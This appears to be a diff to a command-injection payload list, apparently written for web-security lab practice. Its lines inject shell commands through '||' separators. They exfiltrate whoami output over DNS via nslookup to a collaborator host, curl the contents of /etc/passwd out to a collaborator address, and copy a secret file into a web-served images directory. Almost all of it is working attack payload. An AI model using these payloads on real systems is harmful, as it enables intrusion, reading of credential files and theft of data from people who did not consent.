@@ -30,4 +30,7 @@
 || /usr/bin/nslookup <IP> ||
 || nslookup `whoami` <IP> ||
 || nslookup $(whoami) <IP> ||
-|| $(curl $(cat /etc/passwd).<IP-COLLABORATOR>)
+|| $(curl $(cat /etc/passwd).<IP-COLLABORATOR>) ||
+||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+||cat+/home/carlos/secret>>/var/www/images/out.txt||
+
